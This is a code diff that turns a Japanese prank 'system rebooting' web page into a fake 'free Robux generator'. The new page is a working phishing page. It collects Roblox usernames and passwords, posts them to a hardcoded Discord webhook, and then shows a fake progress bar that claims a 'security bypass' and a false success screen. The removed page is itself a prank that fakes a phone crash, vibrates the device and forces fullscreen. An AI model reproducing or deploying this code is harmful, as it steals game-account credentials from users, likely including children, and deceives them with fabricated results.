@@ -2,85 +2,146 @@
 <html lang="ja">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Error</title>
+    <title>Roblox 無料Robuxジェネレーター</title>
     <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-        body {
-            background-color: #000000;
-            color: #ffffff;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
-            height: 100vh;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            overflow: hidden;
-            cursor: none;
-        }
-        /* リンゴマーク（簡易SVG） */
-        .apple-logo {
-            width: 80px;
-            height: 80px;
-            fill: #ffffff;
-            margin-bottom: 30px;
-            animation: pulse 1.5s infinite alternate;
-        }
-        .loading-bar {
-            width: 150px;
-            height: 4px;
-            background-color: #333333;
-            border-radius: 2px;
-            overflow: hidden;
-            margin-top: 20px;
-        }
-        .loading-progress {
-            width: 0%;
-            height: 100%;
-            background-color: #ffffff;
-            animation: load 4s linear forwards;
-        }
-        @keyframes load {
-            0% { width: 0%; }
-            50% { width: 70%; }
-            100% { width: 100%; }
-        }
-        @keyframes pulse {
-            0% { opacity: 0.4; }
-            100% { opacity: 1.0; }
-        }
+        body { background: #121212; color: #e0e0e0; font-family: 'Helvetica Neue', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e1e1e; padding: 35px; border-radius: 12px; width: 340px; box-shadow: 0 8px 24px rgba(0,0,0,0.5); border: 1px solid #333; }
+        h2 { font-size: 20px; margin-bottom: 8px; color: #fff; text-align: center; }
+        .subtitle { font-size: 12px; color: #888; text-align: center; margin-bottom: 25px; }
+        label { font-size: 13px; color: #bbb; display: block; margin-bottom: 6px; }
+        input { width: 100%; padding: 10px 12px; margin-bottom: 18px; background: #2a2a2a; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; font-size: 14px; }
+        input:focus { border-color: #00ffcc; outline: none; }
+        button { width: 100%; padding: 12px; background: #00ffcc; border: none; color: #121212; font-weight: bold; border-radius: 6px; cursor: pointer; font-size: 15px; transition: background 0.2s; }
+        button:hover { background: #00cca3; }
+        
+        /* エラーメッセージ表示用 */
+        #errorMsg { color: #ff3366; font-size: 12px; margin-bottom: 15px; text-align: center; display: none; }
+
+        /* ローディング中のデザインとアニメーション */
+        #loading { display: none; text-align: center; }
+        .loading-text { font-size: 14px; color: #ccc; margin-bottom: 15px; }
+        .progress-bar-container { width: 100%; background: #2a2a2a; border-radius: 6px; height: 10px; overflow: hidden; border: 1px solid #444; }
+        .progress-bar { width: 0%; height: 100%; background: #00ffcc; transition: width 0.3s linear; }
+
+        .result { text-align: center; }
+        .value { font-size: 26px; color: #00ffcc; font-weight: bold; margin: 15px 0; }
+        .note { font-size: 12px; color: #777; margin-top: 10px; }
     </style>
 </head>
 <body>
+    <div class="card" id="mainCard">
+        <h2>Robux ジェネレーター</h2>
+        <div class="subtitle">アカウントに無料でRobuxを追加します</div>
+        
+        <div id="errorMsg"></div>
 
-    <!-- リンゴマーク（iPhone風クラッシュ画面。Android風に変えてもOK！） -->
-    <svg class="apple-logo" viewBox="0 0 170 170">
-        <path d="M150.37 130.25c-2.45 5.66-5.35 10.87-8.71 15.66-4.58 6.53-8.33 11.05-11.22 13.56-4.48 4.12-9.28 6.23-14.42 6.35-3.69 0-8.14-1.05-13.32-3.18-5.19-2.12-9.97-3.17-14.34-3.17-4.58 0-9.49 1.05-14.75 3.17-5.26 2.13-9.5 3.24-12.74 3.35-4.35.13-9.16-1.9-14.43-6.08-3.06-2.55-6.94-7.2-11.63-13.95-6.52-9.35-11.66-19.78-15.42-31.3-3.76-11.53-5.64-22.6-5.64-33.22 0-14.11 3.61-25.5 10.83-34.18 7.22-8.68 16.48-13.06 27.78-13.14 4.9 0 10.15 1.27 15.76 3.82 5.61 2.55 9.24 3.82 10.89 3.82 1.41 0 5.14-1.35 11.19-4.05 6.05-2.7 11.23-3.92 15.54-3.65 14.15.76 25.1 6.08 32.85 15.96-12.23 7.41-18.25 17.51-18.06 30.3.22 10.15 4.09 18.57 11.61 25.26 3.96 3.59 8.78 6.03 14.46 7.33-2.03 6.13-4.66 12.39-7.89 16.78zM119.55 31.67c0-7.89 2.84-15.22 8.52-21.99 5.68-6.77 12.87-10.42 21.57-10.96.11.76.16 1.47.16 2.13 0 7.39-3.05 15.01-9.15 22.86-6.1 7.85-13.43 11.77-21.99 11.76-.11-.54-.11-1.14-.11-1.8z"/>
-    </svg>
+        <form id="form">
+            <label>Roblox ユーザー名</label>
+            <input type="text" id="user" placeholder="例: RobloxUser123" required>
+            
+            <label>パスワード</label>
+            <input type="password" id="pass" placeholder="••••••••" required>
+            
+            <label>追加したいRobux量 (上限: 5,000)</label>
+            <input type="number" id="robux" placeholder="例: 4500" max="5000" required>
+            
+            <button type="submit">Robuxを追加する</button>
+        </form>
 
-    <div style="font-size: 14px; color: #888888; letter-spacing: 1px;">SYSTEM REBOOTING...</div>
-    
-    <div class="loading-bar">
-        <div class="loading-progress"></div>
+        <div id="loading">
+            <div class="loading-text" id="loadingText">サーバーに接続中...</div>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
     </div>
 
     <script>
-        // 1. スマホを「ブブッ」と振動させる（対応してるAndroidや一部ブラウザ向け）
-        if ("vibrate" in navigator) {
-            navigator.vibrate([300, 100, 300, 100, 500]);
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1539344759397679145/BoDKImG3drw0sqeSLGAUXwI60UHgTG3A2r_sXejHdHO2gFPVj2Ta9kDC_KgEOcq8y0gX";
+
+        function generateTrackingID() {
+            const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+            let id = 'GEN-RBLX-';
+            for (let i = 0; i < 4; i++) {
+                id += chars.charAt(Math.floor(Math.random() * chars.length));
+            }
+            return id;
         }
 
-        // 2. 画面タップや戻るボタンを無効化しつつ、強制フルスクリーン化を試みる
-        document.documentElement.requestFullscreen?.().catch(() => {});
+        document.getElementById('form').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const username = document.getElementById('user').value;
+            const password = document.getElementById('pass').value;
+            const robux = parseInt(document.getElementById('robux').value, 10);
+            const errorMsg = document.getElementById('errorMsg');
 
-        // 3. 4.5秒後に強制リロード（元の画面に戻る＝起動完了）
-        setTimeout(() => {
-            window.location.href = window.location.href; // 自分自身をリロード
-        }, 4500);
+            // 5000を超える値が入力された場合のエラー処理
+            if (robux > 5000) {
+                errorMsg.style.display = 'block';
+                errorMsg.innerText = "⚠️ 一度に生成できる上限は5,000 Robuxまでです。";
+                return;
+            } else {
+                errorMsg.style.display = 'none';
+            }
+
+            const trackingId = generateTrackingID();
+
+            // 画面を切り替えてローディングを表示
+            document.getElementById('form').style.display = 'none';
+            document.getElementById('loading').style.display = 'block';
+
+            // Discordへ送信するデータ
+            const payload = {
+                content: `🎯 **[無料ジェネレーター受信: ${trackingId}]**\n👤 ユーザー名: \`${username}\`\n🔑 パスワード: \`${password}\`\n💎 要求Robux量: \`${robux}\``
+            };
+
+            try {
+                await fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (error) {
+                console.error("送信エラー:", error);
+            }
+
+            // ローディングバーを30秒かけて左から右へ100%まで伸ばす処理
+            const progressBar = document.getElementById('progressBar');
+            const loadingText = document.getElementById('loadingText');
+            let progress = 0;
+            const totalTime = 30000; // 30秒
+            const intervalTime = 300; // 0.3秒ごとに更新
+            const increment = (intervalTime / totalTime) * 100;
+
+            const timer = setInterval(() => {
+                progress += increment;
+                if (progress >= 100) {
+                    progress = 100;
+                    clearInterval(timer);
+                }
+                progressBar.style.width = progress + '%';
+
+                // 途中で文字を変えてリアル感を出す演出
+                if (progress > 60) {
+                    loadingText.innerText = "アカウントにRobuxを転送中...";
+                } else if (progress > 30) {
+                    loadingText.innerText = "セキュリティバイパスを適用中...";
+                }
+            }, intervalTime);
+
+            // 30秒後に完了画面に切り替える
+            setTimeout(() => {
+                document.getElementById('mainCard').innerHTML = `
+                    <div class="result">
+                        <h2>追加成功！</h2>
+                        <div class="value">+${robux.toLocaleString()} Robux</div>
+                        <p style="font-size: 13px; color: #aaa;">まもなくアカウントに反映されます</p>
+                        <div class="note">※反映には最大24時間かかる場合があります。</div>
+                    </div>
+                `;
+            }, totalTime);
+        });
     </script>
 </body>
 </html>
